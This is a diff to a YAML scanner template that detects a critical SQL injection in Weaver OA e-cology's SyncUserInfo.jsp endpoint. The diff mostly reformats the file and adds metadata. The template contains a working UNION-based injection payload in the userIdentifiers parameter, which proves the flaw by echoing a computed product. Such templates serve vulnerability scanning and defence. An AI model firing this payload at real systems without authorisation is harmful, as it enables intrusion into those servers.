@@ -2,19 +2,22 @@ id: e-cology-syncuserinfo-sqli
 
 info:
   name: 泛微OA e-cology syncuserinfo SQL注入漏洞
-  author: MaxSecurity(https://github.com/MaxSecurity)
+  author: MaxSecurity
   severity: critical
-  description: 泛微OA e-cology syncuserinfo SQL注入漏洞 app="Weaver-OA"
+  description: |-
+    泛微OA e-cology syncuserinfo SQL注入漏洞 app="Weaver-OA"
   reference:
     - https://www.weaver.com.cn/
+  tags: ecology,sqli
+  created: 2023/06/23
 
 set:
-    r1: randomInt(40000, 44800)
-    r2: randomInt(40000, 44800)
+  r1: randomInt(40000, 44800)
+  r2: randomInt(40000, 44800)
 rules:
-    r0:
-        request:
-            method: GET
-            path: /mobile/plugin/SyncUserInfo.jsp?userIdentifiers=-1)union(select(3),null,null,null,null,null,str({{r1}}*{{r2}}),null
-        expression: response.status == 200 && response.body.bcontains(bytes(string(r1 * r2)))
+  r0:
+    request:
+      method: GET
+      path: /mobile/plugin/SyncUserInfo.jsp?userIdentifiers=-1)union(select(3),null,null,null,null,null,str({{r1}}*{{r2}}),null
+    expression: response.status == 200 && response.body.bcontains(bytes(string(r1 * r2)))
 expression: r0()
